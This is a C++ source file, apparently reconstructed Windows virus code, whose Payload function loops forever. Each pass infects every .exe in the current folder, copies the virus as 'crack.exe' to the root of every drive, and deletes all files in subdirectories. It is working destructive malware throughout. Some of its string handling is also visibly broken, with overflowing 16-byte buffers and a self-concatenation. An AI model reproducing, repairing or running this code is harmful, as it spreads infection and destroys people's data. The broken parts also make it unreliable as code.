#include "data_globals.h"
#include <windows.h>
#include <cstring>

void Payload(void)
{
    WIN32_FIND_DATAA findDataExe;
    WIN32_FIND_DATAA findDataDir;
    WIN32_FIND_DATAA findDataSub;
    char drivePath[42] = {};
    char tempPath[16] = {};
    char baseDir[160] = {};
    char searchPattern[16] = {};
    char dirCopy[16] = {};
    HANDLE hFindExe = INVALID_HANDLE_VALUE;
    HANDLE hFindDir = INVALID_HANDLE_VALUE;
    HANDLE hFindSub = INVALID_HANDLE_VALUE;
    char* driveIter = nullptr;
    size_t driveLen = 0;

    strncpy(drivePath, "crack.exe", 10);

    do {
        Sleep(5000);

        hFindExe = FindFirstFileA("*.exe", &findDataExe);
        if (hFindExe != INVALID_HANDLE_VALUE) {
            do {
                Infect(findDataExe.cFileName, VBuffer);
            } while (FindNextFileA(hFindExe, &findDataExe));
            FindClose(hFindExe);
        }

        GetLogicalDriveStringsA(0x400, Drives);
        for (driveIter = Drives; *driveIter != '\0'; driveIter += driveLen + 1) {
            strcpy(drivePath + 10, driveIter);
            strcat(drivePath + 10, drivePath);
            CopyFileA(Virus, drivePath + 10, 0);
            driveLen = strlen(driveIter);
        }

        hFindDir = FindFirstFileA("*.", &findDataDir);
        if (hFindDir != INVALID_HANDLE_VALUE) {
            do {
                if (findDataDir.dwFileAttributes == 0x10) {
                    strcpy(tempPath, baseDir);
                    strcat(tempPath, findDataDir.cFileName);
                    strcpy(searchPattern, tempPath);
                    strcpy(dirCopy, tempPath);
                    driveLen = strlen(searchPattern);
                    strncpy(searchPattern + driveLen, "\\*.*", 5);
                    hFindSub = FindFirstFileA(searchPattern, &findDataSub);
                    if (hFindSub != INVALID_HANDLE_VALUE) {
                        do {
                            strcpy(tempPath, dirCopy);
                            driveLen = strlen(tempPath);
                            tempPath[driveLen] = '\\';
                            tempPath[driveLen + 1] = '\0';
                            strcat(tempPath, findDataSub.cFileName);
                            DeleteFileA(tempPath);
                        } while (FindNextFileA(hFindSub, &findDataSub));
                        FindClose(hFindSub);
                    }
                }
            } while (FindNextFileA(hFindDir, &findDataDir));
            FindClose(hFindDir);
        }
    } while (true);
}
